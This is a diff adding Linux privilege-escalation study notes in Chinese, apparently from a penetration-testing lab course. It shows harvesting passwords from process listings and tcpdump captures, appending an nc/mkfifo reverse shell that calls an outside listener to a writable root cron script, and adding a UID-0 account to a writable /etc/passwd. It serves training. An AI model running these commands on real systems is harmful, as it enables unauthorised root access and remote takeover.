@@ -721,5 +721,133 @@ eve@debian-privesc:~$ sudo -i
 root@debian-privesc:/home/eve# whoami
 root
 ```
-
 ### Inspecting Service Footprints
+#### watch: ps -aux
+daemons 是在啟動時產生的 Linux 服務，System administrators 依賴 custom daemons 來執行 ad-hoc tasks\
+與 Windows 不同之處，在 Linux 上我們可以列出有關高權限 process 的訊息，可以使用 ps 命令來列舉所有正在運行的 prcess，搭配 watch 命令來更新。
+```
+joe@debian-privesc:~$ watch -n 1 "ps -aux | grep pass"
+...
+
+joe      16867  0.0  0.1   6352  2996 pts/0    S+   05:41   0:00 watch -n 1 ps -aux | grep pass
+root     16880  0.0  0.0   2384   756 ?        S    05:41   0:00 sh -c sshpass -p 'Lab123' ssh  -t eve@127.0.0.1 'sleep 5;exit'
+root     16881  0.0  0.0   2356  1640 ?        S    05:41   0:00 sshpass -p zzzzzz ssh -t eve@127.0.0.1 sleep 5;exit
+...
+```
+> `watch -n 1`：每 1 秒執行一次後面的指令\
+`ps -aux`：列出所有運行中的 process\
+`grep pass`：過濾出有包含 "pass" 的進程 (與密碼有關)
+>> 可以看到 administrator 設置了一個 system daemon，有一個以 root 權限運行的系統 process，使用 sshpass -p 'Lab123' 來執行 SSH 登入 eve@127.0.0.1
+
+#### tcpdump
+利用 tcpdump 進行封包截取，作為提升權限 (Privilege Escalation)
+tcpdump 需要管理員 (root) 權限，因為它使用 raw sockets 來捕獲流量，企業中有些 IT 人員會被授予特定 sudo 權限來執行 tcpdump。
+```
+joe@debian-privesc:~$ sudo tcpdump -i lo -A | grep "pass"
+[sudo] password for joe:
+tcpdump: verbose output suppressed, use -v or -vv for full protocol decode
+listening on lo, link-type EN10MB (Ethernet), capture size 262144 bytes
+...{...zuser:root,pass:lab -
+...5...5user:root,pass:lab -
+```
+## Insecure File Permissions
+Abuse 不安全的 cron job 與 file permissions\
+### Abusing Cron Jobs
+假設已經取得一個低權限使用者
+```
+┌──(chw㉿CHW)-[~]
+└─$ ssh joe@192.168.235.214
+joe@192.168.235.214's password: 
+joe@debian-privesc:~$
+```
+在 linux 系統上， the cron time-based job scheduler is a prime target。如果管理員設定的 cron jobs 權限過於寬鬆 (可被低權限使用者修改)，攻擊者可以修改這個腳本並植入惡意指令，等到 cron 自動執行時，就能以 root 權限執行該指令。
+
+#### 1. 查看有關 CRON 的 syslog
+```
+joe@debian-privesc:~$ grep "CRON" /var/log/syslog
+...
+Aug 25 04:56:07 debian-privesc cron[463]: (CRON) INFO (pidfile fd = 3)
+Aug 25 04:56:07 debian-privesc cron[463]: (CRON) INFO (Running @reboot jobs)
+Aug 25 04:57:01 debian-privesc CRON[918]:  (root) CMD (/bin/bash /home/joe/.scripts/user_backups.sh)
+Aug 25 04:58:01 debian-privesc CRON[1043]: (root) CMD (/bin/bash /home/joe/.scripts/user_backups.sh)
+Aug 25 04:59:01 debian-privesc CRON[1223]: (root) CMD (/bin/bash /home/joe/.scripts/user_backups.sh)
+```
+> `user_backups.sh` 是使用 root 權限
+
+檢查 user_backups.sh 權限
+```
+joe@debian-privesc:~$ cat /home/joe/.scripts/user_backups.sh
+#!/bin/bash
+
+cp -rf /home/joe/ /var/backups/joe/
+
+joe@debian-privesc:~$ ls -lah /home/joe/.scripts/user_backups.sh
+-rwxrwxrw- 1 root root 49 Aug 25 05:12 /home/joe/.scripts/user_backups.sh
+```
+> script 將使用者的主目錄複製到 backups 子目錄\
+> permission: 每個 local user 都可寫入
+
+#### 2. 塞入 Reverse shell
+```
+joe@debian-privesc:~$ cd .scripts
+
+joe@debian-privesc:~/.scripts$ echo >> user_backups.sh
+
+joe@debian-privesc:~/.scripts$ echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.45.210 5678 >/tmp/f" >> user_backups.sh
+
+joe@debian-privesc:~/.scripts$ cat user_backups.sh
+#!/bin/bash
+
+cp -rf /home/joe/ /var/backups/joe/
+
+
+rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.45.210 5678 >/tmp/f
+```
+>`echo >> user_backups.sh`: 只是單純塞入換行符號\
+>`rm /tmp/f;mkfifo /tmp/f;`: 刪除 /tmp/f，然後建立一個 FIFO\
+>`cat /tmp/f | /bin/sh -i 2>&1 `: 讀取 FIFO 並傳給 /bin/sh -i，這樣 sh 會執行從 netcat 傳來的指令\
+>`nc 192.168.45.210 5678 >/tmp/f`: >/tmp/f 讓 Netcat 透過 FIFO 接收命令的輸入
+
+等待 cron 自動執行後，就能收到 reverse shell
+```
+┌──(chw㉿CHW)-[~]
+└─$ nc -nvlp 5678
+listening on [any] 5678 ...
+connect to [192.168.45.210] from (UNKNOWN) [192.168.235.214] 37594
+/bin/sh: 0: can't access tty; job control turned off
+# id
+uid=0(root) gid=0(root) groups=0(root)
+# 
+```
+### Abusing Password Authentication
+除非使用 Active Directory 或 LDAP 等的 centralized credential system，否則 Linux 密碼通常儲存在 `/etc/shadow`，且 normal users 無法讀取。
+
+>[!Important]
+> 如果 `/etc/passwd` 第二欄仍含有密碼雜湊值，它將**優先**於 `/etc/shadow` 被系統用來驗證登入。
+
+代表: 若我們可以寫入 /etc/passwd，就可以有效地為任何帳戶設定任意密碼。
+
+#### OpenSSL 生成 Hash password，注入 /etc/passwd
+
+>[!Note]
+> OpenSSL passwd指令的輸出可能會因執行該指令的系統而異。在較舊的系統上，可能預設為 DES 演算法，而在某些較新的系統上，它可以以 MD5 格式輸出密碼。
+
+```
+joe@debian-privesc:~$ ls -lah /etc/passwd
+-rw-r--rw- 1 root root 2.3K Aug 29  2022 /etc/passwd
+joe@debian-privesc:~$ openssl passwd chw
+nWfVpeIzUj9g6
+joe@debian-privesc:~$ echo "root2:nWfVpeIzUj9g6:0:0:root:/root:/bin/bash" >> /etc/passwd
+joe@debian-privesc:~$ su root2
+Password: 
+root@debian-privesc:/home/joe# id
+uid=0(root) gid=0(root) groups=0(root)
+root@debian-privesc:/home/joe#
+```
+> 1. 發現 `/etc/passwd` 可寫
+> 2. `openssl passwd chw`: 生成密碼為 'chw' 的 hash。 \
+> 若使用參數 `-1`表示使用 MD5 Hashing。
+> 3. `echo "root2:nWfVpeIzUj9g6:0:0:root:/root:/bin/bash" >> /etc/passwd`: 塞入新使用者(root2)，設定對應 hash password 與權限 (user id (UID): `zero` & group id (GID): `zero`)
+
+## Insecure System Components
+
